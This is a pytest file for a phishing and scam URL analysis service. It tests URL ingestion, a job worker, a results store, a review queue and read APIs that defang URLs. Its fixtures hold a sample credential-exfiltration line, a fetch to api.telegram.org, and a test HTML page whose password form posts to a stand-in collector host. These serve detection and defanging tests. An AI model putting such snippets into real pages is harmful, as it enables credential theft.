"""Part 9 Batch B-2: ThreatRadar ingestion, worker, results store, review queue, read APIs.

No network: the analysis engine is a fake that returns prepared AnalysisResponses (or the
real 9B-1 orchestrator with synthetic model arms, in html mode, for the "no raw HTML"
check). Every store is an in-memory SQLite database.
"""

from __future__ import annotations

import asyncio
import csv
import json
import sqlite3
import threading
import time
from datetime import UTC, datetime, timedelta

import pytest
from fastapi.testclient import TestClient
from pydantic import SecretStr

from c2_analyzer.api.dependencies import (
    AnalysisEngine,
    get_engine,
    get_event_bus,
    get_ingest_service,
    get_rate_limiter,
    get_result_cache,
    get_worker,
    settings_dependency,
)
from c2_analyzer.api.guards import RateLimiter, ResultCache
from c2_analyzer.api.main import create_app
from c2_analyzer.config import Settings, project_root
from c2_analyzer.dataset.feeds import parse_manual
from c2_analyzer.ingest.config import IngestConfig, ingest_config
from c2_analyzer.ingest.events import EventBus, format_sse, sse_stream
from c2_analyzer.ingest.pull import pull_threatradar
from c2_analyzer.ingest.review import export_confirmed, export_row
from c2_analyzer.ingest.service import IngestService, UrlItem, review_reason
from c2_analyzer.ingest.stats import research_summary
from c2_analyzer.ingest.worker import IngestWorker, is_transient
from c2_analyzer.schemas.analysis import (
    AnalysisFinding,
    AnalysisInput,
    AnalysisResponse,
    Modalities,
    ModalityResult,
)
from c2_analyzer.store.db import SCHEMA_VERSION, connect
from c2_analyzer.store.repository import ResultsStore
from c2_analyzer.utils.defang import defang_analysis, defang_host, defang_text, defang_url

KEY = "s3cret-test-key"
ALLOW = ("youtube.com", "google.com")
TR_DIR = project_root() / "tests" / "fixtures" / "threatradar"


# ---- helpers --------------------------------------------------------------------------------


class Clock:
    """A controllable UTC clock for the store."""

    def __init__(self) -> None:
        self.now = datetime(2026, 10, 17, 12, 0, tzinfo=UTC)

    def __call__(self) -> datetime:
        return self.now

    def advance(self, **delta) -> None:
        self.now += timedelta(**delta)


def make_response(
    url: str | None,
    verdict: str | None = "Legitimate",
    risk: int | None = 10,
    threat_class: str | None = None,
    status: str = "ok",
    http_status: int | None = 200,
    reason: str | None = None,
    language: str = "en",
    findings: list[AnalysisFinding] | None = None,
) -> AnalysisResponse:
    ok = status == "ok"
    return AnalysisResponse(
        analysis_id=f"an-{abs(hash((url, verdict, risk, time.perf_counter_ns()))) % 10**12}",
        analyzed_at=datetime.now(UTC),
        source="threatradar",
        input=AnalysisInput(
            mode="url", submitted_url=url, final_url=url if ok else None, http_status=http_status
        ),
        status=status,
        status_reason=reason,
        verdict=verdict if ok else None,
        threat_class=threat_class if ok else None,
        risk_score=risk if ok else None,
        page_language=language if ok else None,
        findings=findings or [],
        modalities=Modalities(
            dom=ModalityResult(status="ok"),
            content=ModalityResult(status="ok"),
            behavior=ModalityResult(status="ok"),
        ),
    )


def phishing(url: str, risk: int = 94) -> AnalysisResponse:
    finding = AnalysisFinding(
        id="behavior.credential_exfiltration.external",
        modality="behavior",
        severity="critical",
        title="Password sent to another site",
        detail="The password is sent to api.telegram.org when the form is submitted.",
        evidence="fetch(https://api.telegram.org/bot1/sendMessage)",
    )
    return make_response(url, "Malicious", risk, "phishing", findings=[finding])


class FakeOrchestrator:
    """analyze(request, budget) -> prepared response; records calls and concurrency."""

    def __init__(self, answer=None, delay: float = 0.0) -> None:
        self.answer = answer or (lambda url: make_response(url))
        self.delay = delay
        self.calls: list[str] = []
        self.active = 0
        self.max_active = 0
        self.starts: list[float] = []
        self._lock = threading.Lock()

    def analyze(self, request, budget=None):
        with self._lock:
            self.calls.append(request.url)
            self.starts.append(time.perf_counter())
            self.active += 1
            self.max_active = max(self.max_active, self.active)
        try:
            if self.delay:
                time.sleep(self.delay)
            result = self.answer(request.url)
            if isinstance(result, Exception):
                raise result
            return result
        finally:
            with self._lock:
                self.active -= 1


class FakeEngine:
    def __init__(self, orchestrator=None, error: str | None = None) -> None:
        self.orchestrator = orchestrator or FakeOrchestrator()
        self.error = error

    def get(self):
        if self.error:
            raise RuntimeError(self.error)
        return self.orchestrator


def worker_config(**overrides) -> IngestConfig:
    values = dict(
        concurrency=2,
        jobs_per_second=1000.0,
        max_attempts=3,
        backoff_seconds=0.0,
        idle_poll_seconds=0.02,
        job_time_budget_seconds=5.0,
    )
    return IngestConfig(**{**values, **overrides})


def make_service(clock=None, config: IngestConfig | None = None, bus=None) -> IngestService:
    store = ResultsStore(":memory:", clock=clock or Clock())
    return IngestService(store, bus or EventBus(), config or worker_config(), allow_list=ALLOW)


def realtime_service(**config) -> IngestService:
    """Store with the real clock (the worker compares retry times with 'now')."""
    store = ResultsStore(":memory:")
    return IngestService(store, EventBus(), worker_config(**config), allow_list=ALLOW)


def run_worker(worker: IngestWorker, until, timeout: float = 10.0) -> None:
    """Start the worker, wait for ``until()`` (or the timeout), stop it."""

    async def main():
        await worker.start()
        deadline = time.monotonic() + timeout
        while not until() and time.monotonic() < deadline:
            await asyncio.sleep(0.01)
        await worker.stop()

    asyncio.run(main())


def statuses(service: IngestService) -> dict[str, int]:
    return {k: v for k, v in service.store.job_counts().items() if v}


def finish(service: IngestService, url: str, response: AnalysisResponse) -> int:
    """Queue one URL and record its result as the worker would."""
    job_id = service.enqueue([UrlItem(url)], "threatradar_push").job_ids[0]
    claimed = service.store.claim_next()
    assert claimed is not None and claimed.id == job_id
    service.record_job_result(job_id, response, "threatradar_push")
    return job_id


def api(service: IngestService, key: str | None = KEY, worker=None, engine=None) -> TestClient:
    app = create_app("production", warm_up=False)
    settings = Settings(_env_file=None, ingest_api_key=SecretStr(key or ""))
    app.dependency_overrides[settings_dependency] = lambda: settings
    app.dependency_overrides[get_ingest_service] = lambda: service
    app.dependency_overrides[get_event_bus] = lambda: service.bus
    worker = worker or IngestWorker(service, FakeEngine(), service.config)
    app.dependency_overrides[get_worker] = lambda: worker
    if engine is not None:
        cache, limiter = ResultCache(600, 10), RateLimiter(1000, 60)
        app.dependency_overrides[get_engine] = lambda: engine
        app.dependency_overrides[get_result_cache] = lambda: cache
        app.dependency_overrides[get_rate_limiter] = lambda: limiter
    return TestClient(app)


def post_ingest(client: TestClient, urls, key: str | None = KEY):
    headers = {"X-C2-Ingest-Key": key} if key else {}
    body = {
        "source": "threatradar_push",
        "urls": [u if isinstance(u, dict) else {"url": u} for u in urls],
    }
    return client.post("/api/v1/ingest", json=body, headers=headers)


# ---- storage --------------------------------------------------------------------------------


def test_schema_migrations_run_once_and_upgrade_in_place(tmp_path):
    path = tmp_path / "c2_results.db"
    first = connect(path)
    assert first.execute("PRAGMA user_version").fetchone()[0] == SCHEMA_VERSION
    tables = {r[0] for r in first.execute("SELECT name FROM sqlite_master WHERE type='table'")}
    assert {"scan_jobs", "scan_results", "review_queue"} <= tables
    first.execute(
        "INSERT INTO scan_jobs (url, source, status, created_at) "
        "VALUES ('https://a.com/', 'api', 'queued', 'x')"
    )
    first.close()
    again = connect(path)  # re-opening keeps the data (no rebuild)
    assert again.execute("SELECT COUNT(*) FROM scan_jobs").fetchone()[0] == 1
    with pytest.raises(sqlite3.IntegrityError):  # vocabularies are enforced by the schema
        again.execute(
            "INSERT INTO scan_jobs (url, source, status, created_at) "
            "VALUES ('u', 'nope', 'queued', 'x')"
        )
    again.close()


def test_shipped_ingest_config_is_valid():
    config = ingest_config()
    assert config.max_urls_per_call == 500 and config.dedupe_ttl_hours == 24
    assert config.concurrency == 2 and config.jobs_per_second == 1.0
    assert config.backoff(1) < config.backoff(2) <= config.backoff_max_seconds
    with pytest.raises(ValueError):
        IngestConfig(max_urls_per_call=501)


# ---- ingest API -----------------------------------------------------------------------------


def test_ingest_requires_the_shared_key():
    service = make_service()
    client = api(service)
    assert post_ingest(client, ["https://a-shop.com/"], key=None).status_code == 401
    assert post_ingest(client, ["https://a-shop.com/"], key="wrong").status_code == 401
    # auth is checked before the body: an unauthenticated caller learns nothing
    bad = client.post("/api/v1/ingest", json={"nonsense": 1}, headers={"X-C2-Ingest-Key": "x"})
    assert bad.status_code == 401
    ok = post_ingest(client, ["https://a-shop.com/"])
    assert ok.status_code == 202 and ok.json()["accepted"] == 1
    disabled = api(make_service(), key="")  # no INGEST_API_KEY configured -> switched off
    assert post_ingest(disabled, ["https://a-shop.com/"]).status_code == 503
    assert statuses(service) == {"queued": 1}


def test_ingest_batch_validation():
    service = make_service()
    client = api(service)
    urls = [
        {
            "url": "https://paypa1-login.com/verify",
            "source_ref": {"channel": "lk", "message_id": 7},
        },
        "ftp://files.example.com/x",
        "https://" + "a" * 2050 + ".com/",
        "https://www.youtube.com/watch?v=1",  # allow-listed
        "HTTPS://PAYPA1-LOGIN.com:443/verify#x",  # same URL as the first, other spelling
        "not a url",
        {"url": "https://usdt-double.xyz/", "source_ref": {"subreddit": "x", "extra": "ignored"}},
    ]
    response = post_ingest(client, urls)
    body = response.json()
    assert response.status_code == 202
    assert body["accepted"] == 2 and body["duplicates"] == 1
    assert [r["index"] for r in body["rejected"]] == [1, 2, 3, 5]
    reasons = {r["index"]: r["reason"] for r in body["rejected"]}
    assert "http or https" in reasons[1] and "2048" in reasons[2]
    assert reasons[3] == "allow-listed"
    for rejected in body["rejected"]:  # shown defanged too
        assert not any(s in rejected["url"] for s in ("http://", "https://", "ftp://", ".com/"))
    assert len(body["job_ids"]) == 3 and body["queue_depth"] == 2
    first = service.store.job(body["job_ids"][0])
    assert first["source_ref"] == {"channel": "lk", "message_id": 7}
    duplicate = service.store.job(body["job_ids"][1])
    assert duplicate["status"] == "skipped_duplicate" and duplicate["duplicate_of"] == first["id"]

    too_many = post_ingest(client, [f"https://s{i}.com/" for i in range(501)])
    assert too_many.status_code == 422
    assert post_ingest(client, []).status_code == 422
    raw = client.post(
        "/api/v1/ingest",
        content=b"{}",
        headers={"X-C2-Ingest-Key": KEY, "Content-Type": "text/plain"},
    )
    assert raw.status_code == 415


def test_queue_full_rejects_the_rest():
    service = make_service(config=worker_config(max_queue_depth=2))
    result = service.enqueue([UrlItem(f"https://s{i}.com/") for i in range(4)], "threatradar_push")
    assert result.accepted == 2 and [r.reason for r in result.rejected] == ["queue full"] * 2


def test_dedupe_within_ttl_reuses_the_result():
    clock = Clock()
    service = make_service(clock)
    original = finish(service, "https://scam-shop.com/", phishing("https://scam-shop.com/"))
    clock.advance(hours=23)
    again = service.enqueue([UrlItem("https://SCAM-shop.com")], "threatradar_push")
    assert again.accepted == 0 and again.duplicates == 1
    duplicate_id = again.job_ids[0]
    assert service.store.result(duplicate_id)["analysis_id"] == (
        service.store.result(original)["analysis_id"]
    )
    client = api(service)
    assert client.get(f"/api/v1/scans/{duplicate_id}").json()["verdict"] == "Malicious"

    clock.advance(hours=2)  # 25 h later: analysed again
    later = service.enqueue([UrlItem("https://scam-shop.com/")], "threatradar_push")
    assert later.accepted == 1


def test_unreachable_results_are_not_reused():
    service = make_service()
    finish(
        service,
        "https://gone.com/",
        make_response("https://gone.com/", status="unreachable", http_status=404),
    )
    assert service.enqueue([UrlItem("https://gone.com/")], "threatradar_push").accepted == 1


def test_queued_url_is_a_duplicate_while_in_flight():
    service = make_service()
    first = service.enqueue([UrlItem("https://new-scam.com/")], "threatradar_push")
    second = service.enqueue([UrlItem("https://new-scam.com/")], "threatradar_push")
    assert first.accepted == 1 and second.duplicates == 1
    assert service.store.job(second.job_ids[0])["duplicate_of"] == first.job_ids[0]


# ---- worker ---------------------------------------------------------------------------------


def test_worker_processes_the_queue_respecting_concurrency():
    service = realtime_service(concurrency=2)
    orchestrator = FakeOrchestrator(delay=0.15)
    worker = IngestWorker(service, FakeEngine(orchestrator), service.config)
    service.enqueue([UrlItem(f"https://site{i}.com/") for i in range(6)], "threatradar_push")
    run_worker(worker, lambda: statuses(service) == {"done": 6})
    assert statuses(service) == {"done": 6}
    assert orchestrator.max_active == 2  # never more than `concurrency` at once
    assert worker.processed == 6 and worker.status().state == "stopped"


def test_worker_rate_limits_job_starts():
    service = realtime_service(concurrency=4, jobs_per_second=10.0)
    orchestrator = FakeOrchestrator()
    worker = IngestWorker(service, FakeEngine(orchestrator), service.config)
    service.enqueue([UrlItem(f"https://r{i}.com/") for i in range(4)], "threatradar_push")
    run_worker(worker, lambda: statuses(service) == {"done": 4})
    # 4 starts at 10 jobs/s = 3 intervals of 0.1 s (the span, not single gaps: Windows
    # timers and thread start-up add jitter to individual starts)
    starts = sorted(orchestrator.starts)
    assert len(starts) == 4 and starts[-1] - starts[0] >= 0.25


def test_transient_errors_are_retried_then_fail():
    service = realtime_service(max_attempts=3)
    timeout = make_response(
        None, status="unreachable", http_status=None, reason="timeout after 10s"
    )
    orchestrator = FakeOrchestrator(lambda url: timeout)
    worker = IngestWorker(service, FakeEngine(orchestrator), service.config)
    job_id = service.enqueue([UrlItem("https://slow.com/")], "threatradar_push").job_ids[0]
    run_worker(worker, lambda: statuses(service) == {"failed": 1})
    job = service.store.job(job_id)
    assert job["status"] == "failed" and job["attempts"] == 3
    assert "gave up after 3 attempt(s): timeout" in job["error"]
    assert len(orchestrator.calls) == 3 and worker.retried == 2 and worker.failed == 1


def test_retry_succeeds_after_a_hiccup():
    service = realtime_service()
    answers = iter([make_response(None, status="unreachable", http_status=503, reason="HTTP 503")])
    orchestrator = FakeOrchestrator(lambda url: next(answers, None) or make_response(url))
    worker = IngestWorker(service, FakeEngine(orchestrator), service.config)
    job_id = service.enqueue([UrlItem("https://busy.com/")], "threatradar_push").job_ids[0]
    run_worker(worker, lambda: statuses(service) == {"done": 1})
    assert service.store.job(job_id)["attempts"] == 2 and len(orchestrator.calls) == 2


def test_permanent_problems_are_not_retried():
    blocked = make_response(None, status="unreachable", http_status=None, reason="private")
    blocked.findings.append(
        AnalysisFinding(
            id="fetch.blocked", modality="fetch", severity="info", title="t", detail="d"
        )
    )
    not_found = make_response(None, status="unreachable", http_status=404, reason="HTTP 404")
    loop = make_response(
        None, status="unreachable", http_status=None, reason="more than 5 redirects"
    )
    assert not any(is_transient(r) for r in (blocked, not_found, loop, make_response("u")))
    assert is_transient(make_response(None, status="unreachable", http_status=429))

    service = realtime_service()
    orchestrator = FakeOrchestrator(lambda url: not_found)
    worker = IngestWorker(service, FakeEngine(orchestrator), service.config)
    job_id = service.enqueue([UrlItem("https://gone.com/")], "threatradar_push").job_ids[0]
    run_worker(worker, lambda: statuses(service) == {"done": 1})
    assert len(orchestrator.calls) == 1  # stored as a finished, unreachable result
    assert service.store.result(job_id)["status"] == "unreachable"


def test_a_crashing_analysis_does_not_stop_the_worker():
    service = realtime_service(max_attempts=1)
    orchestrator = FakeOrchestrator(
        lambda url: ValueError("boom") if "bad" in url else make_response(url)
    )
    worker = IngestWorker(service, FakeEngine(orchestrator), service.config)
    service.enqueue([UrlItem("https://bad.com/"), UrlItem("https://good.com/")], "threatradar_push")
    run_worker(worker, lambda: statuses(service) == {"done": 1, "failed": 1})
    assert statuses(service) == {"done": 1, "failed": 1}


def test_models_not_loaded_gives_the_job_back_without_counting():
    service = realtime_service()
    worker = IngestWorker(service, FakeEngine(error="loading failed"), service.config)

    async def fast_sleep(seconds):
        await asyncio.sleep(min(seconds, 0.01))

    worker.sleep = fast_sleep
    job_id = service.enqueue([UrlItem("https://wait.com/")], "threatradar_push").job_ids[0]
    run_worker(worker, lambda: worker.last_error is not None, timeout=3)
    job = service.store.job(job_id)
    assert job["status"] == "queued" and job["attempts"] == 0
    assert "models not loaded" in worker.last_error


def test_restart_recovery_requeues_running_jobs():
    service = realtime_service()
    job_id = service.enqueue([UrlItem("https://crash.com/")], "threatradar_push").job_ids[0]
    assert service.store.claim_next().id == job_id  # a previous process died mid-job
    assert statuses(service) == {"running": 1}
    worker = IngestWorker(service, FakeEngine(), service.config)
    recovered = []

    async def main():
        recovered.append(await worker.start())
        deadline = time.monotonic() + 5
        while statuses(service) != {"done": 1} and time.monotonic() < deadline:
            await asyncio.sleep(0.01)
        await worker.stop()

    asyncio.run(main())
    assert recovered == [1] and statuses(service) == {"done": 1}
    assert service.store.job(job_id)["attempts"] == 2  # the lost attempt still counts


def test_disabled_worker_never_starts():
    service = realtime_service()
    worker = IngestWorker(service, FakeEngine(), service.config, enabled=False)
    asyncio.run(worker.start())
    assert not worker.running and worker.status().state == "disabled"


# ---- review queue ---------------------------------------------------------------------------


def test_review_queue_rules():
    assert review_reason({"verdict": "Malicious", "risk_score": 83}, 70) == "verdict Malicious"
    assert review_reason({"verdict": "Suspicious", "risk_score": 75}, 70)
    assert review_reason({"verdict": "Suspicious", "risk_score": 60}, 70) is None
    assert review_reason({"verdict": "Legitimate", "risk_score": 5}, 70) is None
    assert review_reason({"verdict": None, "risk_score": None}, 70) is None

    clock = Clock()
    service = make_service(clock)
    finish(service, "https://m.com/", phishing("https://m.com/"))
    finish(
        service,
        "https://s75.com/",
        make_response("https://s75.com/", "Suspicious", 75, "crypto_scam"),
    )
    finish(service, "https://s60.com/", make_response("https://s60.com/", "Suspicious", 60))
    finish(service, "https://ok.com/", make_response("https://ok.com/"))
    clock.advance(hours=30)  # analysed again after the TTL: no second review item
    finish(service, "https://m.com/", phishing("https://m.com/"))
    pending = service.store.reviews("pending")
    assert [item["url"] for item in pending] == ["https://m.com/", "https://s75.com/"]
    assert pending[1]["reason"] == "Suspicious with risk 75 >= 70"


def test_review_export_matches_the_manual_feed(tmp_path):
    service = make_service()
    tg = service.enqueue(
        [UrlItem("https://paypa1-verify.com/login", {"channel": "deals_lk", "message_id": 12})],
        "threatradar_push",
    ).job_ids[0]
    service.store.claim_next()
    service.record_job_result(tg, phishing("https://paypa1-verify.com/login"), "threatradar_push")
    rd = service.enqueue(
        [UrlItem("https://coin-x2.com/", {"subreddit": "CryptoScams", "post_id": "1ab"})],
        "threatradar_push",
    ).job_ids[0]
    service.store.claim_next()
    service.record_job_result(
        rd,
        make_response("https://coin-x2.com/", "Malicious", 90, "crypto_scam", language="si_latn"),
        "threatradar_push",
    )
    service.store.decide_review(tg, "confirmed", "phishing", "Dilshan")
    service.store.decide_review(rd, "confirmed", "crypto_scam", "Dilshan")

    out = tmp_path / "feeds" / "live_review_urls.csv"
    report = export_confirmed(service.store, out)
    assert report.written == 2
    header = out.read_text(encoding="utf-8").splitlines()[0]
    assert header == "url,label,language_hint,source,notes"  # = data/feeds/manual_urls.csv
    imported = parse_manual(out)  # the Part 1 importer accepts every row
    assert imported.rejected == [] and len(imported.candidates) == 2
    first, second = imported.candidates
    assert (first.url, first.suggested_label, first.source) == (
        "https://paypa1-verify.com/login",
        "phishing",
        "social_media_report",
    )
    assert second.language_hint == "si" and second.source == "social_media_report"
    analysis_id = service.store.result(tg)["analysis_id"]
    assert f"analysis_id={analysis_id}" in first.notes and "ThreatRadar live" in first.notes
    assert "channel @deals_lk message_id=12" in first.notes

    assert export_confirmed(service.store, out).written == 0  # already exported
    service.store.decide_review(rd, "confirmed", "crypto_scam", "Dilshan")  # decided again
    again = export_confirmed(service.store, out)
    assert again.written == 0 and again.already_in_file == 1  # URL already in the file


def test_export_row_refuses_rows_part1_would_reject():
    item = {
        "url": "https://x.com/",
        "decided_label": "not_a_label",
        "analysis_id": "a",
        "job_id": 1,
        "source_ref": {},
    }
    with pytest.raises(ValueError):
        export_row(item)


def test_rejected_reviews_are_never_exported(tmp_path):
    service = make_service()
    job = finish(service, "https://fp.com/", phishing("https://fp.com/"))
    service.store.decide_review(job, "rejected", "benign", "Dilshan")
    assert export_confirmed(service.store, tmp_path / "out.csv").written == 0


# ---- read APIs ------------------------------------------------------------------------------


def fill_history(service: IngestService, clock: Clock) -> dict[str, int]:
    ids = {}
    ids["legit"] = finish(
        service, "https://news-site.com/", make_response("https://news-site.com/")
    )
    clock.advance(minutes=10)
    ids["mal"] = finish(
        service, "https://paypal-secure-login.com/a", phishing("https://paypal-secure-login.com/a")
    )
    clock.advance(minutes=10)
    ids["sus"] = finish(
        service,
        "https://usdt-bonus.xyz/",
        make_response("https://usdt-bonus.xyz/", "Suspicious", 72, "crypto_scam", language="si"),
    )
    clock.advance(minutes=10)
    ids["gone"] = finish(
        service,
        "https://gone.com/",
        make_response("https://gone.com/", status="unreachable", http_status=404),
    )
    clock.advance(minutes=10)
    request = type(
        "R",
        (),
        {
            "url": "https://user-check.com/?email=a@b.com",
            "source": "user",
            "request_id": "ui-1",
            "mode": "url",
        },
    )()
    service.record_user_check(request, make_response("https://user-check.com/"))
    ids["user"] = service.store.list_scans(limit=1)[0]["id"]
    return ids


def test_scans_list_filters_and_pagination():
    clock = Clock()
    service = make_service(clock)
    ids = fill_history(service, clock)
    client = api(service)
    everything = client.get("/api/v1/scans").json()
    assert [i["id"] for i in everything["items"]] == sorted(ids.values(), reverse=True)
    assert everything["next_cursor"] is None
    item = next(i for i in everything["items"] if i["id"] == ids["mal"])
    assert item["url"] == "hxxps://paypal-secure-login[.]com/a"
    assert item["final_domain"] == "paypal-secure-login[.]com"
    assert (item["verdict"], item["threat_class"], item["risk_score"]) == (
        "Malicious",
        "phishing",
        94,
    )
    user = next(i for i in everything["items"] if i["id"] == ids["user"])
    assert user["source"] == "user" and "a@b.com" not in user["url"]  # PII masked

    def ids_of(**params):
        return [i["id"] for i in client.get("/api/v1/scans", params=params).json()["items"]]

    assert ids_of(verdict="Malicious") == [ids["mal"]]
    assert ids_of(verdict="none") == [ids["gone"]]
    assert ids_of(threat_class="crypto_scam") == [ids["sus"]]
    assert ids_of(source="user") == [ids["user"]]
    assert ids_of(q="USDT") == [ids["sus"]]
    assert ids_of(q="%") == []  # LIKE wildcards are literal
    assert ids_of(since=(clock.now - timedelta(minutes=15)).isoformat()) == [
        ids["user"],
        ids["gone"],
    ]
    assert client.get("/api/v1/scans", params={"threat_class": "x"}).status_code == 422
    assert client.get("/api/v1/scans", params={"since": "yesterday"}).status_code == 422

    pages, cursor = [], None
    while True:
        params = {"limit": 2} | ({"cursor": cursor} if cursor else {})
        page = client.get("/api/v1/scans", params=params).json()
        pages.append([i["id"] for i in page["items"]])
        cursor = page["next_cursor"]
        if not cursor:
            break
    assert [len(p) for p in pages] == [2, 2, 1]
    assert sum(pages, []) == sorted(ids.values(), reverse=True)  # no overlap, nothing lost


def test_scan_detail_is_defanged_and_404s():
    clock = Clock()
    service = make_service(clock)
    ids = fill_history(service, clock)
    client = api(service)
    body = client.get(f"/api/v1/scans/{ids['mal']}").json()
    assert body["input"]["submitted_url"] == "hxxps://paypal-secure-login[.]com/a"
    finding = body["findings"][0]
    assert "api[.]telegram[.]org" in finding["detail"]
    assert finding["evidence"] == "fetch(hxxps://api[.]telegram[.]org/bot1/sendMessage)"
    assert finding["id"] == "behavior.credential_exfiltration.external"  # ids untouched
    assert client.get("/api/v1/scans/999999").status_code == 404
    queued = service.enqueue([UrlItem("https://later.com/")], "threatradar_push").job_ids[0]
    late = client.get(f"/api/v1/scans/{queued}")
    assert late.status_code == 404 and "queued" in late.json()["detail"]


def test_stats_overview_numbers():
    clock = Clock()
    service = make_service(clock)
    fill_history(service, clock)
    service.enqueue([UrlItem("https://news-site.com/")], "threatradar_push")  # duplicate
    service.enqueue([UrlItem("https://waiting.com/")], "threatradar_push")  # queued
    client = api(service)
    stats = client.get("/api/v1/stats/overview", params={"window": "24h"}).json()
    assert stats["total"] == 5 and stats["duplicates_skipped"] == 1
    assert stats["by_verdict"] == {"Legitimate": 2, "Suspicious": 1, "Malicious": 1, "none": 1}
    assert stats["by_status"] == {"ok": 4, "unreachable": 1}
    assert stats["by_threat_class"] == {"phishing": 1, "crypto_scam": 1}
    assert stats["by_source"] == {"threatradar_push": 4, "user": 1}
    assert stats["by_language"]["si"] == 1 and stats["by_language"]["en"] == 3
    assert {d["key"] for d in stats["top_domains"]} == {
        "paypal-secure-login[.]com",
        "usdt-bonus[.]xyz",
    }
    assert stats["top_brands"] == [{"key": "paypal", "count": 1}]
    assert stats["series_bucket"] == "hour" and len(stats["series"]) in (24, 25)
    assert sum(p["total"] for p in stats["series"]) == 5
    assert sum(p["flagged"] for p in stats["series"]) == 2
    assert stats["queue"]["queued"] == 1 and stats["queue"]["done"] == 5
    assert stats["review"] == {"pending": 2, "confirmed": 0, "rejected": 0}
    assert stats["worker"]["state"] == "stopped" and stats["worker"]["concurrency"] == 2
    month = client.get("/api/v1/stats/overview", params={"window": "30d"}).json()
    assert month["series_bucket"] == "day" and 30 <= len(month["series"]) <= 31
    assert client.get("/api/v1/stats/overview", params={"window": "1y"}).status_code == 422
    clock.advance(days=2)
    assert client.get("/api/v1/stats/overview").json()["total"] == 0


def test_research_summary_reads_existing_reports():
    summary = research_summary("v0.3")
    if summary["missing"]:
        pytest.skip(f"reports not present: {summary['missing']}")
    assert summary["dataset"]["total"] == 459
    cross = summary["dataset"]["label_by_language"]
    assert sum(sum(row.values()) for row in cross.values()) == 459
    assert cross["benign"]["si"] >= 1
    rows = summary["ablation"]["rows"]
    assert rows and all(len(r["test_macro_f1_ci"]) == 2 for r in rows)
    assert all(r["benign_fpr_at_threshold"] is not None for r in rows)
    assert summary["ablation"]["final"]["selected_for_row"] is True
    assert summary["operating_points"]["calibration"]["dataset_version"] == "v0.3"
    assert "fusion" in summary["models"]
    missing = research_summary("v9.9")
    assert missing["dataset"] is None and len(missing["missing"]) == 4


# ---- live feed ------------------------------------------------------------------------------


def test_sse_emits_an_event_after_a_job_finishes():
    service = realtime_service()
    worker = IngestWorker(service, FakeEngine(FakeOrchestrator(phishing)), service.config)
    received: list[str] = []

    async def main():
        async def connected() -> bool:
            return False

        stream = sse_stream(service.bus, connected, heartbeat_seconds=5)
        assert (await anext(stream)).startswith("retry:")  # subscribed
        await worker.start()
        service.enqueue([UrlItem("https://live-scam.com/x")], "threatradar_push")
        received.append(await asyncio.wait_for(anext(stream), timeout=5))
        await worker.stop()
        await stream.aclose()

    asyncio.run(main())
    lines = received[0].strip().splitlines()
    assert lines[1] == "event: scan" and lines[0].startswith("id: ")
    event = json.loads(lines[2].removeprefix("data: "))
    assert event["url"] == "hxxps://live-scam[.]com/x"
    assert event["verdict"] == "Malicious" and event["risk_score"] == 94
    assert set(event) == {
        "id",
        "url",
        "verdict",
        "threat_class",
        "risk_score",
        "source",
        "created_at",
    }
    assert service.bus.subscribers == 0  # closed stream unsubscribed


def test_sse_heartbeat_and_slow_client_drop_oldest():
    bus = EventBus()

    async def main():
        async def gone() -> bool:
            return True

        stream = sse_stream(bus, gone, heartbeat_seconds=0.05)
        await anext(stream)
        with pytest.raises(StopAsyncIteration):  # idle + disconnected -> stream ends
            await anext(stream)
        queue = bus.subscribe()
        for number in range(150):
            bus.publish({"id": number})
        await asyncio.sleep(0.05)
        assert queue.qsize() == 100 and queue.get_nowait()["id"] == 50

    asyncio.run(main())
    assert (
        format_sse({"id": 3, "url": "x"}) == 'id: 3\nevent: scan\ndata: {"id": 3, "url": "x"}\n\n'
    )


def test_feed_stream_endpoint_is_registered_as_sse():
    client = api(make_service())
    spec = client.get("/openapi.json").json()["paths"]["/api/v1/feed/stream"]["get"]
    assert "text/event-stream" in spec["responses"]["200"]["content"]


# ---- /analyze history -----------------------------------------------------------------------


def test_user_checks_are_stored_and_storage_errors_never_fail_analyze():
    from tests.test_analyze import NEWS_HTML, Network, html_response, make_orchestrator

    service = make_service()
    network = Network({"shop.example": html_response(NEWS_HTML)})
    engine = AnalysisEngine(factory=lambda: make_orchestrator(network=network))
    client = api(service, engine=engine)
    first = client.post("/api/v1/analyze", json={"url": "https://shop.example/", "source": "user"})
    second = client.post("/api/v1/analyze", json={"url": "https://shop.example/", "source": "user"})
    assert first.status_code == second.status_code == 200 and second.json()["cached"] is True
    pasted = client.post("/api/v1/analyze", json={"html": NEWS_HTML})
    assert pasted.status_code == 200
    rows = service.store.list_scans()
    assert [r["source"] for r in rows] == ["api", "user", "user"]
    assert rows[0]["url"] == "(pasted HTML)" and len(network.requested) == 1

    class Broken(ResultsStore):
        def insert_finished(self, *args, **kwargs):
            raise sqlite3.OperationalError("disk I/O error")

    broken = IngestService(Broken(":memory:"), EventBus(), worker_config(), allow_list=ALLOW)
    client = api(broken, engine=engine)
    assert client.post("/api/v1/analyze", json={"html": NEWS_HTML}).status_code == 200


def test_no_raw_html_or_live_url_in_any_read_api():
    """Real 9B-1 engine (synthetic arms) on a page full of HTML; then every read API."""
    from tests.test_analyze import make_orchestrator

    page = (
        "<html><head><title>Verify</title><script>var k='secret'</script></head><body>"
        '<form action="https://collector.example/x.php"><input type="password" name="p">'
        "<button>Sign in</button></form><p>Visit https://evil-login.com/now</p></body></html>"
    )
    service = make_service()
    engine = AnalysisEngine(factory=lambda: make_orchestrator())
    client = api(service, engine=engine)
    analyzed = client.post(
        "/api/v1/analyze",
        json={"html": page, "url": "https://evil-login.com/now", "source": "user"},
    )
    assert analyzed.status_code == 200
    scan_id = service.store.list_scans()[0]["id"]
    bodies = [
        client.get("/api/v1/scans").text,
        client.get(f"/api/v1/scans/{scan_id}").text,
        client.get("/api/v1/stats/overview").text,
        client.get("/api/v1/research/summary").text,
    ]
    for body in bodies:
        lowered = body.lower()
        for tag in ("<html", "<script", "<form", "<input", "<button", "var k="):
            assert tag not in lowered
        assert "https://" not in lowered and "http://" not in lowered
        assert "evil-login.com" not in lowered


# ---- backup pull ----------------------------------------------------------------------------


def test_pull_queues_new_threatradar_urls_once():
    service = make_service()
    report = pull_threatradar(TR_DIR, service)
    assert report.read and not report.missing_files
    queued = report.queued
    assert queued.accepted > 0
    assert any(r.reason == "allow-listed" for r in queued.rejected)
    jobs = [service.store.job(i) for i in queued.job_ids]
    assert {j["source"] for j in jobs} == {"threatradar_pull"}
    assert any("channel" in j["source_ref"] for j in jobs)
    assert any("subreddit" in j["source_ref"] for j in jobs)
    assert any("reasons" in j["source_ref"] for j in jobs)

    again = pull_threatradar(TR_DIR, service)  # nothing new: every URL already known
    assert again.queued.accepted == 0 and again.queued.already_known == queued.accepted + (
        queued.duplicates
    )


